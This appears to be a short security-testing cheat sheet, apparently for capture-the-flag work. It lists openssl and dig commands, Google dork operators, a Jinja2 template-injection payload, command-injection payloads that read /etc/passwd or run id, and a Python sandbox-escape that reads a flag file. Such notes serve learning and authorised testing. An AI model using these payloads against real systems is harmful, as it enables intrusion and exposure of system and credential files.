# tips

## RSA

秘密鍵の中身を見る

```
openssl rsa -in <private-key.pem> -text -noout
```

公開鍵の中身を見る

```
openssl rsa -pubin -in <public-key.pem> -text -noout
```

## DNS

dig

```
dig <example.com> IN
dig <example.com> ANY
dig <example.com> TXT
```

## Phishing

- MX (Mail exchange record)
- SPF (Sender Policy Framework)
- DKIM (DomainKeys Identified Mail)
- DMARC (Domain-based Message Authentication, Reporting and Conformance)

## OSINT

- Google Dorks: https://www.exploit-db.com/google-hacking-database

  - ext: `ext:(doc | pdf | xls | txt)`
  - filetype: `filetype:log`
  - intext: `intext:"Control Panel"`
  - intitle: `intitle:"Manager"`
  - inurl: `inurl:index.php`
  - site: `site:ftp.*.*.*`

## SSTI

**Server Side Template Injection**

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

Jinja2

```
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```

## SQLi

**SQL Injection**

- LIKE: `%`, `*`

## Command Injection

**Unix Payloads**

```
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
;netstat -a;
;system('cat%20/etc/passwd')
|id
\n/bin/ls -al\n
a);id
%0Acat%20/etc/passwd
& ping -i 30 127.0.0.1 &
<?php system("cat /etc/passwd");?>
```

**Windows Payloads**

```
'
'"
"
"'
%0a
%0a%0d
eval('ls')
exec('ls')
system('ls')
| sleep 1
; sleep 1
& sleep 1
&& sleep 1`
```

Links:

- https://github.com/payloadbox/command-injection-payload-list

**Payloads with Python**

```
a=().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']
a('os').popen('cat flag').read()
```

Bypass:

- to Hex: `(` => `\\x28`
- to Octal: `(` => `\50`

## Databases

- Default Passwords: https://cirt.net/passwords
- Exploit: https://www.exploit-db.com/

## Shodan:

- https://exploits.shodan.io/welcome

## Sites

- requestbin: https://requestbin.com/
